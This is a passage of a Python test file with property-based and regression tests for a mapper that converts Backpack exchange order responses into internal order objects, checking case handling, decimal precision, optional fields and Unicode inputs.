    ) -> None:
        """Property: Status mapping should be consistent regardless of case."""
        input_status, expected_status = status_mapping

        result = trading_data_mapper.transform_order_data_to_internal(
            order_id="test_status",
            symbol=SOL_USDC_BP,
            side="Buy",
            order_type="LIMIT",
            status=input_status,
            quantity="1.0",
            price="100.0",
        )

        # Property: Status should be mapped consistently
        assert result.status == expected_status

    @given(
        enum_mappings=st.builds(
            _create_enum_mappings_tuple,
            st.sampled_from(["buy", "BUY", "Buy", "sell", "SELL", "Sell"]),
            st.sampled_from(["limit", "LIMIT", "Limit", "market", "MARKET", "Market"]),
            st.sampled_from(["new", "NEW", "New", "filled", "FILLED", "Filled"]),
            st.sampled_from(["gtc", "GTC", "Gtc", "ioc", "IOC", "Ioc", None]),
        )
    )
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_case_insensitive_enum_mappings(
        self,
        enum_mappings: tuple[str, str, str, str | None],
        trading_data_mapper: BackpackOrderMapper,
    ) -> None:
        """Property: All enum mappings should be case insensitive."""
        side, order_type, status, time_in_force = enum_mappings

        result = trading_data_mapper.transform_order_data_to_internal(
            order_id="case_test",
            symbol=SOL_USDC_BP,
            side=side,
            order_type=order_type,
            status=status,
            quantity="1.0",
            time_in_force=time_in_force,
        )

        # Property: Case should not affect enum mapping results
        expected_side = OrderSide.BUY if side.upper() == "BUY" else OrderSide.SELL
        assert result.side == expected_side

        expected_type = OrderType.LIMIT if order_type.upper() == "LIMIT" else OrderType.MARKET
        assert result.order_type == expected_type

        if time_in_force is not None:
            expected_tif = {"GTC": TimeInForce.GTC, "IOC": TimeInForce.IOC}.get(
                time_in_force.upper(), TimeInForce.GTC
            )
            assert result.time_in_force == expected_tif

    @given(precision_values=st.lists(financial_decimal_string_strategy(), min_size=3, max_size=5))
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_decimal_precision_consistency_across_fields(
        self, precision_values: list[str], trading_data_mapper: BackpackOrderMapper
    ) -> None:
        """Property: Decimal precision should be maintained consistently across all fields."""
        # Skip invalid values
        valid_values: list[str] = []
        for value in precision_values:
            try:
                decimal_val = Decimal(value)
                if decimal_val > Decimal(0):
                    valid_values.append(value)
            except (ValueError, TypeError, OverflowError):
                continue

        if len(valid_values) < 3:
            assume(False)

        quantity, price, executed_qty = valid_values[0], valid_values[1], valid_values[2]

        # Ensure executed_qty <= quantity for consistency
        try:
            if Decimal(executed_qty) > Decimal(quantity):
                executed_qty = quantity
        except (ValueError, TypeError, OverflowError):
            executed_qty = "0.0"

        raw_order = BackpackRawOrderResponse(
            id="precision_test",
            clientId="test_client",
            relatedOrderId=None,
            symbol="BTC-USDC",
            side="Buy",
            orderType="LIMIT",
            status="NEW",
            quantity=quantity,
            executedQuantity=executed_qty,
            executedQuoteQuantity=None,
            price=price,
            triggerPrice=None,
            avgFillPrice=None,
            triggerBy=None,
            timeInForce="GTC",
            reduceOnly=False,
            postOnly=False,
            selfTradePrevention=None,
            createdAt=datetime.now(UTC).isoformat(),
            updatedAt=datetime.now(UTC).isoformat(),
            triggeredAt=None,
            expiryReason=None,
            origin=None,
        )

        result = trading_data_mapper.transform_raw_order_to_internal(raw_order)

        # Property: Precision should be maintained exactly
        assert result.quantity_requested == Decimal(quantity)
        if result.price is not None:
            assert result.price == Decimal(price)
        assert result.quantity_filled == Decimal(executed_qty)

    @given(
        none_scenario=st.sampled_from([
            "market_order",  # price is None
            "no_fills",  # avg_fill_price is None
            "no_client_id",  # client_id is None
            "all_optional_none",  # multiple None values
        ])
    )
    @settings(max_examples=50, deadline=timedelta(seconds=1))
    def test_none_value_handling_consistency(
        self, none_scenario: str, trading_data_mapper: BackpackOrderMapper
    ) -> None:
        """Property: None values should be handled consistently across transformations."""
        if none_scenario == "market_order":
            order_data = {
                "price": None,
                "order_type": "MARKET",
                "client_id": "test_client",
                "avg_fill_price": None,
            }
        elif none_scenario == "no_fills":
            order_data = {
                "price": "100.0",
                "order_type": "LIMIT",
                "client_id": "test_client",
                "avg_fill_price": None,
            }
        elif none_scenario == "no_client_id":
            order_data = {
                "price": "100.0",
                "order_type": "LIMIT",
                "client_id": None,
                "avg_fill_price": None,
            }
        else:  # all_optional_none
            order_data = {
                "price": None,
                "order_type": "MARKET",
                "client_id": None,
                "avg_fill_price": None,
            }

        # DEFENSIVE CHECK: order_type is always set to valid values in test scenarios
        assert order_data["order_type"] is not None
        raw_order = BackpackRawOrderResponse(
            id="none_test",
            clientId=order_data["client_id"],
            relatedOrderId=None,
            symbol="BTC-USDC",
            side="Buy",
            orderType=order_data["order_type"],
            status="NEW",
            quantity="1.0",
            executedQuantity="0.0",
            executedQuoteQuantity=None,
            price=order_data["price"],
            triggerPrice=None,
            avgFillPrice=order_data["avg_fill_price"],
            triggerBy=None,
            timeInForce="GTC",
            reduceOnly=False,
            postOnly=False,
            selfTradePrevention=None,
            createdAt=datetime.now(UTC).isoformat(),
            updatedAt=datetime.now(UTC).isoformat(),
            triggeredAt=None,
            expiryReason=None,
            origin=None,
        )

        result = trading_data_mapper.transform_raw_order_to_internal(raw_order)

        # Property: None values should be handled appropriately
        if order_data["price"] is None:
            assert result.price is None
        if order_data["avg_fill_price"] is None:
            assert result.average_fill_price is None
        if order_data["client_id"] is None:
            # Should generate a UUID
            assert result.client_order_id is not None
            assert len(result.client_order_id) > 0


# =============================================================================
# INTEGRATION PROPERTY TESTS
# =============================================================================


class TestTradingDataIntegrationProperties:
    """Integration property tests for trading data transformation workflows."""

    @given(mixed_order_batch=st.lists(backpack_raw_order_strategy(), min_size=5, max_size=20))
    @settings(max_examples=30, deadline=timedelta(seconds=1))
    def test_mixed_order_processing_workflow(
        self,
        mixed_order_batch: list[BackpackRawOrderResponse],
        trading_data_mapper: BackpackOrderMapper,
    ) -> None:
        """Property: Mixed order processing should be consistent and reliable."""
        successful_transformations: list[tuple[BackpackRawOrderResponse, Order]] = []
        failed_transformations: list[tuple[BackpackRawOrderResponse, str]] = []

        for raw_order in mixed_order_batch:
            try:
                # Skip orders with invalid quantities
                if raw_order.quantity is None:
                    continue
                qty_decimal = Decimal(raw_order.quantity)
                if qty_decimal <= Decimal(0):
                    continue

                result = trading_data_mapper.transform_raw_order_to_internal(raw_order)
                successful_transformations.append((raw_order, result))
            except (TransformationError, ValueError, TypeError, AttributeError) as e:
                failed_transformations.append((raw_order, str(e)))

        # Property: At least some transformations should succeed
        if not successful_transformations:
            assume(False)

        # Property: All successful transformations should be valid
        for raw_order, result in successful_transformations:
            assert isinstance(result, Order)
            assert result.exchange_order_id == raw_order.id
            assert result.symbol.value == raw_order.symbol
            assert raw_order.quantity is not None  # Validated in loop above
            assert result.quantity_requested == Decimal(raw_order.quantity)

    def _is_valid_order(self, raw_order: BackpackRawOrderResponse) -> bool:
        """Check if order has valid data for transformation.

        Returns:
            bool: True if order has valid data, False otherwise.
        """
        if raw_order.quantity is None:
            return False
        try:
            qty_decimal = Decimal(raw_order.quantity)
            return qty_decimal > Decimal(0)
        except (ValueError, TypeError, OverflowError):
            return False

    def _process_transform_operation(
        self, raw_order: BackpackRawOrderResponse, trading_data_mapper: BackpackOrderMapper
    ) -> tuple[str, str, Order]:
        """Process a transform operation.

        Returns:
            tuple[str, str, Order]: Operation type, order ID, and transformed order.
        """
        result = trading_data_mapper.transform_raw_order_to_internal(raw_order)
        return ("transform", raw_order.id, result)

    def _process_validate_operation(
        self, raw_order: BackpackRawOrderResponse, trading_data_mapper: BackpackOrderMapper
    ) -> tuple[str, str, Order]:
        """Process a validate operation.

        Returns:
            tuple[str, str, Order]: Operation type, order ID, and validated order.
        """
        result1 = trading_data_mapper.transform_raw_order_to_internal(raw_order)
        result2 = trading_data_mapper.transform_raw_order_to_internal(raw_order)
        assert result1.exchange_order_id == result2.exchange_order_id
        assert result1.quantity_requested == result2.quantity_requested
        return ("validate", raw_order.id, result1)

    def _process_compare_operation(
        self, raw_order: BackpackRawOrderResponse, trading_data_mapper: BackpackOrderMapper
    ) -> tuple[str, str, Order] | None:
        """Process a compare operation.

        Returns:
            tuple[str, str, Order] | None: Operation result or None if invalid.
        """
        result1 = trading_data_mapper.transform_raw_order_to_internal(raw_order)
        try:
            # Validate quantity is not None before passing to method that expects str
            if raw_order.quantity is None:
                return None
            result2 = trading_data_mapper.transform_order_data_to_internal(
                order_id=raw_order.id,
                symbol=exchanges.backpack(raw_order.symbol),
                side=raw_order.side,
                order_type=raw_order.orderType,
                status=raw_order.status,
                quantity=raw_order.quantity,
                price=raw_order.price,
                client_order_id=raw_order.clientId,
            )
        except (TransformationError, ValueError, TypeError, AttributeError):
            # Order data method may have different validation
            return None
        else:
            assert result1.exchange_order_id == result2.exchange_order_id
            return ("compare", raw_order.id, result1)

    @given(
        transformation_sequence=st.lists(
            st.tuples(
                backpack_raw_order_strategy(), st.sampled_from(["transform", "validate", "compare"])
            ),
            min_size=3,
            max_size=10,
        )
    )
    @settings(max_examples=20, deadline=timedelta(seconds=1))
    def test_transformation_sequence_consistency(
        self,
        transformation_sequence: list[tuple[BackpackRawOrderResponse, str]],
        trading_data_mapper: BackpackOrderMapper,
    ) -> None:
        """Property: Transformation sequences should maintain consistency."""
        transformation_results: list[tuple[str, str, Order]] = []

        for raw_order, operation in transformation_sequence:
            try:
                if not self._is_valid_order(raw_order):
                    continue

                if operation == "transform":
                    transform_result = self._process_transform_operation(
                        raw_order, trading_data_mapper
                    )
                    transformation_results.append(transform_result)
                elif operation == "validate":
                    validate_result = self._process_validate_operation(
                        raw_order, trading_data_mapper
                    )
                    transformation_results.append(validate_result)
                elif operation == "compare":
                    compare_result = self._process_compare_operation(raw_order, trading_data_mapper)
                    if compare_result is not None:
                        transformation_results.append(compare_result)
            except (ValueError, TypeError, OverflowError):
                continue

        # Property: Should have some successful operations
        if transformation_results:
            # All results should be valid Order instances
            for _operation, order_id, result in transformation_results:
                assert isinstance(result, Order)
                assert result.exchange_order_id == order_id


# =============================================================================
# LEGACY COMPATIBILITY TESTS
# =============================================================================


def test_minimal_order_data_compatibility() -> None:
    """Test transformation with minimal required order data for regression verification."""
    mapper = BackpackOrderMapper()

    minimal_order = BackpackRawOrderResponse(
        id="1",
        clientId=None,
        relatedOrderId=None,
        symbol="BTC-USDC",
        side="Buy",
        orderType="LIMIT",
        status="NEW",
        quantity="1",
        executedQuantity="0",
        executedQuoteQuantity=None,
        price="50000.0",
        triggerPrice=None,
        avgFillPrice=None,
        triggerBy=None,
        timeInForce="GTC",
        reduceOnly=False,
        postOnly=False,
        selfTradePrevention=None,
        createdAt=datetime.now(UTC).isoformat(),
        updatedAt=datetime.now(UTC).isoformat(),
        triggeredAt=None,
        expiryReason=None,
        origin=None,
    )

    result = mapper.transform_raw_order_to_internal(minimal_order)

    assert result.exchange_order_id == "1"
    assert result.symbol.value == "BTC-USDC"
    assert result.side == OrderSide.BUY
    assert result.order_type == OrderType.LIMIT
    assert result.status == OrderStatus.OPEN
    assert result.client_order_id is not None
    assert len(result.client_order_id) > 0


def test_extreme_values_compatibility() -> None:
    """Test transformation with extreme values for regression verification."""
    mapper = BackpackOrderMapper()

    extreme_order = BackpackRawOrderResponse(
        id="999999999",
        clientId="x" * 32,  # Reasonable length
        relatedOrderId=None,
        symbol="EXTREME_SYMBOL",
        side="Sell",
        orderType="LIMIT",
        status="NEW",
        quantity="0.000001",
        executedQuantity="0.0",
        executedQuoteQuantity=None,
        price="999999.999999",
        triggerPrice=None,
        avgFillPrice=None,
        triggerBy=None,
        timeInForce="FOK",
        reduceOnly=False,
        postOnly=False,
        selfTradePrevention=None,
        createdAt=datetime.now(UTC).isoformat(),
        updatedAt=datetime.now(UTC).isoformat(),
        triggeredAt=None,
        expiryReason=None,
        origin=None,
    )

    result = mapper.transform_raw_order_to_internal(extreme_order)

    assert result.exchange_order_id == "999999999"
    assert result.client_order_id == "x" * 32
    assert result.symbol.value == "EXTREME_SYMBOL"
    assert result.side == OrderSide.SELL
    assert result.quantity_requested == Decimal("0.000001")
    assert result.price == Decimal("999999.999999")
    assert result.time_in_force == TimeInForce.FOK


def test_unicode_support_compatibility() -> None:
    """Test Unicode support for regression verification."""
    mapper = BackpackOrderMapper()

    unicode_order = BackpackRawOrderResponse(
        id="unicode_test",
        clientId="client_測試_123",
        relatedOrderId=None,
        symbol="BTC-USDC🚀",
        side="Buy",
        orderType="LIMIT",
        status="NEW",
        quantity="1.0",
        executedQuantity="0.0",
        executedQuoteQuantity=None,
        price="100.0",
        triggerPrice=None,
        avgFillPrice=None,
        triggerBy=None,
        timeInForce="GTC",
        reduceOnly=False,
        postOnly=False,
        selfTradePrevention=None,
        createdAt=datetime.now(UTC).isoformat(),
        updatedAt=datetime.now(UTC).isoformat(),
        triggeredAt=None,
        expiryReason=None,
        origin=None,
    )

    result = mapper.transform_raw_order_to_internal(unicode_order)

    assert result.symbol.value == "BTC-USDC🚀"
    assert result.client_order_id == "client_測試_123"
    assert result.exchange_order_id == "unicode_test"
